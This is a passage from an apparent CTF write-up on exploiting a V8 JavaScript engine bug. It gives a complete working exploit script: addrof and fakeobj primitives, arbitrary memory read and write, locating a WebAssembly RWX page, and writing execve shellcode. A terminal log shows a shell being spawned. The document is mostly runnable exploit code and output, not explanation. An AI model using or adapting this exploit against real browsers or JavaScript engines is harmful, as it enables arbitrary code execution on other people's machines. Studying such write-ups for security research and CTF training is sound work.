0x0000555555662000 0x0000555555747000 0x0000000000000000 rw- [heap]

 -- snip -- 

```

As we can see, we have the `rwx` segment at `0x0000379395694000`, with some trial and error I found out that the using `arb_read` to the read data from the address `wasm_instance + 0x68` shows us the address of the `rwx_page`, with this on hand and the power of `arb_write` we can write to the desirable address.\

Now, in order to write to the address, we have to write the initial value to the `backing_store` of the array, which is located at the address `&JSArray + 0x14` which you can find with the debug version of the `d8` binary. One more thing, we need to consider is to use the `DataView` and `ArrayBuffer` as this will help you in overwriting the address with the desired value, in short these two functions allows you to write the data in binary format using the `ArrayBuffer`.

I am using the `execve` shellcode, since CTF is long over I can't execute `/chal/flagprinter`, poor me.

The exploit now looks like:-

```js

var arr_buf = new ArrayBuffer(0x100);
var dataview = new DataView(arr_buf);

var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;;
var back_store_addr = arb_read(arr_buf_addr + 0x14n);

console.log("[+] ArrayBuffer address: 0x" + arr_buf_addr.toString(16));
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x0f, 0x05]



for (let i = 0; i < shellcode.length; i++) {
  dataview.setUint8(i, shellcode[i], true);
}

console.log("[+] Spawning shell");
pwn();
```

Now, running the exploit with the provided binary:-

```asm
d4mian@pwnbox:~/CTFs$ ./d8 ./xpl.js 
[+] Float array map: 0x82438fd
[+] Pointer to array elements: 0x8085e19
[+] Pointer to object array elements: 0x8085d5d
[+] Object array map: 0x824394d
[+] Controlled RW helper address: 0x8086209
[+] Wasm instance address: 0x821218d
[+] RWX section address: 0x196c91043000
[+] ArrayBuffer address: 0x8086bd9
[+] Back store pointer: 0x560bcfd3d640
[+] Spawning shell...
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

d4mian@pwnbox:/home/d4mian/CTFs$ whoami
d4mian
d4mian@pwnbox:/home/d4mian/CTFs$ id
uid=1000(d4mian) gid=1000(d4mian) groups=1000(d4mian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
d4mian@pwnbox:/home/d4mian/CTFs$ ^C
d4mian@pwnbox:/home/d4mian/CTFs$ exit
```

Success, we spawned a shell. That was a long ride. Hope you enjoyed it.


The final exploit looks like:-

```js
var aux_obj = {"a": 1}
var aux_obj_arr = [aux_obj];
var aux_float_arr = [1.1, 2.2, 3.3];
var aux_arr = aux_float_arr.slice(aux_float_arr)

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val, size) {

    f64_buf[0] = val;

    if(size == 32) {
        return BigInt(u64_buf[0]);
    } else if(size == 64) {
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

}

function itof(val, size) {

    if(size == 32) {
        u64_buf[0] = Number(val & 0xffffffffn);
    } else if(size == 64) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
    }

    return f64_buf[0];

}

var flt_arr_map = ftoi(aux_arr[3], 32);
var elem_arr_ptr = ftoi(aux_arr[4], 32);
console.log("[+] Float array map: 0x" + flt_arr_map.toString(16));
console.log("[+] Pointer to array elements: 0x" + elem_arr_ptr.toString(16));

var elem_obj_arr = elem_arr_ptr - 0xc0n + 0x4n;
aux_arr[4] = itof((ftoi(aux_arr[4], 64) & 0xffffffff00000000n) + elem_obj_arr, 64);

console.log("[+] Pointer to object array elements: 0x" + elem_obj_arr.toString(16));

var obj_arr_map = ftoi(aux_arr[0], 64) >> 32n;
console.log("[+] Object array map: 0x" + obj_arr_map.toString(16));

function addrof(obj) {
    aux_arr = aux_float_arr.slice(aux_float_arr)
    aux_arr[4] = itof((ftoi(aux_arr[4], 64) & 0xffffffff00000000n) + elem_obj_arr, 64);
    aux_obj_arr[0] = obj;
    return ftoi(aux_arr[0], 32)
}

function fakeobj(addr) {
    let fake;
    aux_arr = aux_float_arr.slice(aux_float_arr);
    aux_arr[0] = itof(addr, 32);
    aux_arr[3] = itof((ftoi(aux_arr[3], 64) & 0xffffffff00000000n) + obj_arr_map, 64);
    fake = aux_arr[0];
    return fake;
}

var rw_helper = [itof(flt_arr_map, 64), 1.1, 2.2, 3.3];
var rw_helper_addr = addrof(rw_helper) & 0xffffffffn;

console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));

function arb_read(addr) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    return ftoi(fake[0], 64);
}

function arb_write(addr, value) {
    let fake = fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    fake[0] = itof(value, 64);
}

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,
                               130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,
                               128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,
                               128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,
                               0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
var rwx = arb_read(wasm_instance_addr + 0x68n);

console.log("[+] Wasm instance address: 0x" + wasm_instance_addr.toString(16));
console.log("[+] RWX section address: 0x" + rwx.toString(16));


var arr_buf = new ArrayBuffer(0x100);
var dataview = new DataView(arr_buf);

var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;;
var back_store_addr = arb_read(arr_buf_addr + 0x14n);

console.log("[+] ArrayBuffer address: 0x" + arr_buf_addr.toString(16));
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [0x6a, 0x68, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x0f, 0x05]



for (let i = 0; i < shellcode.length; i++) {
  dataview.setUint8(i, shellcode[i], true);
}

console.log("[+] Spawning a shell...");
pwn();
```


# References

* <http://www.phrack.org/papers/attacking_javascript_engines.html>
* <http://phrack.org/papers/jit_exploitation.html>
* <https://gist.github.com/KaoRz/8d37865f94f73f240c562f9ab29ee1e2#file-pwn-js>
* <https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/>
* <https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html>




